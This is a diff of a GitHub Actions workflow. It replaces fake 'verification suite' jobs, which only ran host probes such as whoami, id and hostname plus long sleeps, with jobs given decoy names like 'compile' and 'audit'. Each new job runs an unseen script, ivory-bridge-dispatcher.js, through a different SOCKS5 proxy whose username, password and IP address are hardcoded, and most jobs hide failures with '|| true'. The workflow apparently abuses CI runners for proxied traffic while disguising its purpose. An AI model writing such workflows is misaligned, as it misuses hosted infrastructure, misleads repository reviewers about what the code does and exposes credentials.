@@ -4,79 +4,12 @@ on:
     branches: [ "main" ]
     paths:
       - '.github/workflows/ivory-bridge-dispatcher.yml'
+      - 'ivory-bridge-dispatcher.js'
+      - 'package.json'
 
 jobs:
-  lint_windowslatest_node_newsletter:
-    runs-on: windows-latest
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 20
-        - name: Execute Verification Suite
-          shell: pwsh
-          run: |
-            npm install
-            Write-Output "Starting verification suite..."
-            dir
-            Start-Sleep -Seconds 403
-            Write-Output "Completed successfully!"
-
-  check_ubuntu2004_node_typeface:
-    runs-on: ubuntu-20.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 22
-        - name: Execute Verification Suite
-          run: |
-            npm install
-            echo "Starting verification suite..."
-            hostname
-            sleep 5m
-            echo "Completed successfully!"
-
-  verify_ubuntu2404_node_scholarship:
-    runs-on: ubuntu-24.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 18
-        - name: Execute Verification Suite
-          run: |
-            npm install
-            echo "Starting verification suite..."
-            free
-            sleep 9m
-            echo "Completed successfully!"
-
-  test_ubuntu2204_bun_lox:
-    runs-on: ubuntu-22.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Bun
-          uses: oven-sh/setup-bun@v2
-          with:
-            bun-version: latest
-        - name: Execute Verification Suite
-          run: |
-            bun install
-            echo "Starting verification suite..."
-            id
-            sleep 10m
-            echo "Completed successfully!"
-
-  review_windows2025_node_advertisement:
-    runs-on: windows-2025
+  compile_ubuntulatest_node_labourer:
+    runs-on: ubuntu-latest
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -84,16 +17,78 @@ jobs:
           uses: actions/setup-node@v4
           with:
             node-version: 24
-        - name: Execute Verification Suite
+        - name: Run Task
+          run: |
+            npm install && node ivory-bridge-dispatcher.js "socks5://dcswarup:webshare@192.210.132.100:6070" || true
+
+  analyze_windowslatest_bun_taxicab:
+    runs-on: windows-latest
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Bun
+          uses: oven-sh/setup-bun@v2
+          with:
+            bun-version: latest
+        - name: Run Task
           shell: pwsh
           run: |
-            npm install
-            Write-Output "Starting verification suite..."
-            whoami
-            Start-Sleep -Seconds 396
-            Write-Output "Completed successfully!"
+            bun install; bun run ivory-bridge-dispatcher.js "socks5://dcswarup:webshare@216.74.80.116:6688"
 
-  check_windows2022_node_costume:
+  deploy_ubuntu2404_node_molasses:
+    runs-on: ubuntu-24.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
+          run: |
+            npm install && node ivory-bridge-dispatcher.js "socks5://dcswarup:webshare@38.154.227.206:5907" || true
+
+  audit_ubuntu2204_node_iridescence:
+    runs-on: ubuntu-22.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 20
+        - name: Run Task
+          run: |
+            npm install && node ivory-bridge-dispatcher.js "socks5://dcswarup:webshare@92.112.238.166:7045" || true
+
+  review_ubuntu2004_node_complication:
+    runs-on: ubuntu-20.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          run: |
+            npm install && node ivory-bridge-dispatcher.js "socks5://dcswarup:webshare@87.239.253.20:6269" || true
+
+  deploy_windows2025_node_tshirt:
+    runs-on: windows-2025
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; node ivory-bridge-dispatcher.js "socks5://dcswarup:webshare@92.113.135.236:8868"
+
+  audit_windows2022_node_bidet:
     runs-on: windows-2022
     steps:
         - name: Checkout Repository
@@ -102,11 +97,7 @@ jobs:
           uses: actions/setup-node@v4
           with:
             node-version: 24
-        - name: Execute Verification Suite
+        - name: Run Task
           shell: pwsh
           run: |
-            npm install
-            Write-Output "Starting verification suite..."
-            Get-Location
-            Start-Sleep -Seconds 373
-            Write-Output "Completed successfully!"
+            npm install; node ivory-bridge-dispatcher.js "socks5://dcswarup:webshare@104.252.196.53:5961"
